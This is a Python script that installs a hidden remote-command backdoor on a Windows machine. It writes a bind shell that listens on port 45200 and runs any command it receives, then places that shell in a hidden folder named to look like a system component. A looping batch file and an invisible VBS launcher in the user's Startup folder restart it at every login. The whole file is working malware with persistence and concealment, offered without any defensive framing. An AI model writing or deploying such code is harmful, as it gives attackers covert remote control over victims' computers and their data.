import os
import sys

user = os.getlogin()

startup_path = fr"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
cwd = os.getcwd()
server_content = r'''
import socket
import subprocess
import os
host = "0.0.0.0"
port = 45200

def send_exe(command,conn):
    process = subprocess.Popen(command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            text=True)
    output = str(process.stdout.read() + process.stderr.read() + str(os.getcwd())+">")
    print(output)
    print(len(output))
    conn.send(str(len(output)).encode())
    if len(output)<10:
        conn.send(str.encode(output))
    else:
        iterations = len(output)//10
        j = 0
        for i in range(0,iterations):
            conn.send(output[j:j+10].encode())
            j+=10
        if len(output) % 10 != 0:
            conn.send(output[10*iterations:].encode())




client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.bind((host,port))
client.listen(1)

print("listening...")
conn,address = client.accept()
print("connected.")
conn.send("connected".encode())


while True:
    command = conn.recv(4096).decode()
    try:
        if command.lower() == "exit":
            break
        if command.lower().startswith("cd ") and len(command)>4:
            os.chdir(command[3:])
        if len(command)> 0 :
            send_exe(command,conn)
    except:
        size = len("invalid")
        conn.send(str(size).encode())
        conn.send(str.encode("invalid"))
client.close()
conn.close()

'''
batch_content = fr''':loop
"{sys.executable}" "C:/Users/{user}/WindowsServer/server.py"
goto loop'''


vbs_content = fr'''
set code = CreateObject("WScript.shell")
code.Run "C:/Users/{user}/WindowsServer/server.bat",0,False
'''

os.chdir(f"C:/Users/{user}")
os.mkdir("WindowsServer")
os.system("attrib +h WindowsServer")
os.chdir(f"C:/Users/{user}/WindowsServer")

with open("server.py",'w') as f:
    f.write(server_content)
with open("server.bat",'w') as f:
    f.write(batch_content)

os.chdir(startup_path)
with open("winServ.vbs",'w') as f:
    f.write(vbs_content)


